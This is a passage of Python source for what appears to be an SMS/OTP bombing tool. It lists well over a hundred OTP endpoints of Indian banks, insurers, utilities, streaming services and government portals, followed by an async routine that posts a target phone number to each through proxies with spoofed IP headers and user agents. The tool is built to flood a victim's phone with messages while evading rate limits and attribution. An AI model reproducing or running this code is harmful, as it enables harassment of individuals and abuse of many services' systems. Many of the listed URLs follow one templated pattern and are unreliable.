    {"name": "irctc_sms", "url": "https://www.irctc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "redbus_sms", "url": "https://www.redbus.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "oyo_sms", "url": "https://api.oyoroomscrm.com/api/v2/user/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "treebo_sms", "url": "https://www.treebo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "cleartrip_sms", "url": "https://www.cleartrip.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "easemytrip_sms", "url": "https://www.easemytrip.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "yatra_sms", "url": "https://www.yatra.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ixigo_sms", "url": "https://www.ixigo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "netflix_sms", "url": "https://www.netflix.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "primevideo_sms", "url": "https://www.primevideo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "hotstar_sms", "url": "https://www.hotstar.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "sonyliv_sms", "url": "https://www.sonyliv.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "zee5_sms", "url": "https://www.zee5.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "jiocinema_sms", "url": "https://www.jiocinema.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "voot_sms", "url": "https://www.voot.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "mxplayer_sms", "url": "https://www.mxplayer.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "altbalaji_sms", "url": "https://www.altbalaji.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "spotify_sms", "url": "https://www.spotify.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "gaana_sms", "url": "https://www.gaana.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "wynk_sms", "url": "https://www.wynk.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "jiosaavn_sms", "url": "https://www.jiosaavn.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "linkedin_sms", "url": "https://www.linkedin.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "naukri_sms", "url": "https://www.naukri.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "indeed_sms", "url": "https://www.indeed.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "shine_sms", "url": "https://www.shine.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "monster_sms", "url": "https://www.monster.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "timesjobs_sms", "url": "https://www.timesjobs.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "freshersworld_sms", "url": "https://www.freshersworld.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "upwork_sms", "url": "https://www.upwork.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "fiverr_sms", "url": "https://www.fiverr.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "freelancer_sms", "url": "https://www.freelancer.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "toptal_sms", "url": "https://www.toptal.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "housing_sms", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "magicbricks_sms", "url": "https://www.magicbricks.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "99acres_sms", "url": "https://www.99acres.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "commonfloor_sms", "url": "https://www.commonfloor.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "nobroker_sms", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "squareyards_sms", "url": "https://www.squareyards.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "pokerbaazi_sms", "url": "https://www.pokerbaazi.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "my11circle_sms", "url": "https://www.my11circle.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "dream11_sms", "url": "https://www.dream11.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "mpl_sms", "url": "https://www.mpl.live/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "paytmfirstgames_sms", "url": "https://firstgames.paytm.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "adda52_sms", "url": "https://www.adda52.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "rummycircle_sms", "url": "https://www.rummycircle.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "jupiter_sms", "url": "https://jupiter.money/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "groww_sms", "url": "https://groww.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "zerodha_sms", "url": "https://zerodha.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "angelone_sms", "url": "https://www.angelone.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "upstox_sms", "url": "https://upstox.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "5paisa_sms", "url": "https://www.5paisa.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "icicidirect_sms", "url": "https://www.icicidirect.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "hdfcsec_sms", "url": "https://www.hdfcsec.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "sharekhan_sms", "url": "https://www.sharekhan.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "motilaloswal_sms", "url": "https://www.motilaloswal.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "kotaksec_sms", "url": "https://www.kotaksecurities.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "axisdirect_sms", "url": "https://www.axisdirect.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "iifl_sms", "url": "https://www.iifl.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "edelweiss_sms", "url": "https://www.edelweiss.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "jmfinancial_sms", "url": "https://www.jmfinancial.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "anandrathi_sms", "url": "https://www.anandrathi.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "geojit_sms", "url": "https://www.geojit.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "sbilife_sms", "url": "https://www.sbilife.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "hdfclife_sms", "url": "https://www.hdfclife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "icicipru_sms", "url": "https://www.iciciprulife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "maxlife_sms", "url": "https://www.maxlifeinsurance.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "tataaia_sms", "url": "https://www.tataaia.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "bajajallianz_sms", "url": "https://www.bajajallianz.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "reliancenippon_sms", "url": "https://www.reliancenipponlife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "adityabirla_sms", "url": "https://lifeinsurance.adityabirlacapital.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "pnbmetlife_sms", "url": "https://www.pnbmetlife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "kotaklife_sms", "url": "https://www.kotaklife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "airtelbank_sms", "url": "https://www.airtel.in/bank/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ippb_sms", "url": "https://www.ippbonline.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "finopay_sms", "url": "https://www.finopayments.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "jiopay_sms", "url": "https://www.jiopaymentsbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "nsdlpay_sms", "url": "https://www.nsdlpaymentsbank.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "suryoday_sms", "url": "https://www.suryodaybank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "utkarsh_sms", "url": "https://www.utkarshbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "equitas_sms", "url": "https://www.equitasbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "cityunion_sms", "url": "https://www.cityunionbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "dcb_sms", "url": "https://www.dcbbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "tmb_sms", "url": "https://www.tmb.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "csb_sms", "url": "https://www.csb.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "esaf_sms", "url": "https://www.esafbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "fincare_sms", "url": "https://www.fincarebank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "janabank_sms", "url": "https://www.janabank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "jkbank_sms", "url": "https://www.jkbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "karnatakabank_sms", "url": "https://www.karnatakabank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "keralagbank_sms", "url": "https://www.keralagbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "paytmbank_sms", "url": "https://www.paytmbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "airtel_thanks_sms", "url": "https://www.airtel.in/thanks/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "jio_sms", "url": "https://www.jio.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "vi_sms", "url": "https://www.myvi.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "bsnl_sms", "url": "https://www.bsnl.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "tataplay_sms", "url": "https://www.tataplay.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "dishtv_sms", "url": "https://www.dishtv.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "airteldth_sms", "url": "https://www.airtel.in/dth/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "jiofiber_sms", "url": "https://www.jio.com/fiber/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "hathway_sms", "url": "https://www.hathway.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "den_sms", "url": "https://www.dennetworks.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "siticable_sms", "url": "https://www.siticable.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "tatapower_sms", "url": "https://www.tatapower.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "adani_sms", "url": "https://www.adanielectricity.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "bses_sms", "url": "https://www.bsesdelhi.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "tpddl_sms", "url": "https://www.tpddl.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "torrent_sms", "url": "https://www.torrentpower.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "uppcl_sms", "url": "https://www.uppcl.org/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "mseb_sms", "url": "https://www.mahadiscom.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "gescom_sms", "url": "https://www.gescom.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "bescom_sms", "url": "https://www.bescom.org/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "cesc_sms", "url": "https://www.cesc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "wbsedcl_sms", "url": "https://www.wbsedcl.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "gujaratgas_sms", "url": "https://www.gujaratgas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "mahanagargas_sms", "url": "https://www.mahanagargas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "igl_sms", "url": "https://www.iglonline.net/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "hpgas_sms", "url": "https://www.hpgas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "bharatgas_sms", "url": "https://www.bharatgas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "indane_sms", "url": "https://www.indane.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "delhijal_sms", "url": "https://www.delhijalboard.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "mcgm_sms", "url": "https://portal.mcgm.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "chennaimetrowater_sms", "url": "https://www.chennaimetrowater.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "bwssb_sms", "url": "https://www.bwssb.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "phedraj_sms", "url": "https://phed.rajasthan.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "upsmd_sms", "url": "https://upsmd.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "kwa_sms", "url": "https://www.kwa.kerala.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "phedpunjab_sms", "url": "https://phed.punjab.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "hpjal_sms", "url": "https://jalashakti.hp.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "jaljeevan_sms", "url": "https://jaljeevanmission.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "swachh_sms", "url": "https://swachhbharatmission.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "pmay_sms", "url": "https://pmaymis.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "nhai_sms", "url": "https://nhai.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "epfo_sms", "url": "https://www.epfindia.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "esic_sms", "url": "https://www.esic.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "incometax_sms", "url": "https://www.incometax.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "gst_sms", "url": "https://www.gst.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "mca_sms", "url": "https://www.mca.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "passport_sms", "url": "https://portal2.passportindia.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "voter_sms", "url": "https://www.nvsp.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "aadhaar_sms", "url": "https://uidai.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "pan_sms", "url": "https://www.protean-tinpan.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "driving_sms", "url": "https://parivahan.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "vehicle_sms", "url": "https://vahan.parivahan.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "digilocker_sms", "url": "https://www.digilocker.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "umang_sms", "url": "https://umang.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "csc_sms", "url": "https://www.csc.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "nic_sms", "url": "https://www.nic.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "mygov_sms", "url": "https://www.mygov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "cpgrams_sms", "url": "https://pgportal.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "nationalportal_sms", "url": "https://www.india.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "railconnect_sms", "url": "https://railconnect.indianrail.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "airindia_sms", "url": "https://www.airindia.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "indigo_sms", "url": "https://www.goindigo.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "spicejet_sms", "url": "https://www.spicejet.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "akasa_sms", "url": "https://www.akasaair.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "vistara_sms", "url": "https://www.airvistara.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "gofirst_sms", "url": "https://www.flygofirst.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "olamoney_sms", "url": "https://www.olamoney.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "amazonpay_sms", "url": "https://pay.amazon.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
]

print(f"✅ Loaded {len(ULTIMATE_APIS)} APIs")


# ═══════════════════════════════════════════════════════════
# 💣 FIRE ONE — with proxy + device spoofing
# ═══════════════════════════════════════════════════════════
async def fire_one(session, api, phone, stats, proxy_url, session_id):
    try:
        headers = dict(api["headers"])
        headers["X-Forwarded-For"] = fake_ip()
        headers["Client-IP"] = fake_ip()
        # Only override UA if not explicitly set to a specific UA
        if headers.get("User-Agent") in (None, "Mozilla/5.0"):
            headers["User-Agent"] = fake_ua()
        headers["X-Session-Id"] = session_id

        url = api["url"](phone) if callable(api["url"]) else api["url"]
        data = api["data"](phone) if api.get("data") else None
        method = api["method"].upper()

        kwargs = {
            "headers": headers,
            "ssl": False,
            "proxy": proxy_url,
            "timeout": aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
        }

        if method == "POST":
            async with session.post(url, data=data, **kwargs) as r:
                status = r.status
                try: text = await r.text()
                except: text = ""
        else:
            async with session.get(url, **kwargs) as r:
                status = r.status
                try: text = await r.text()
                except: text = ""

        stats["total"] += 1
        if status < 400:
            stats["http_ok"] += 1
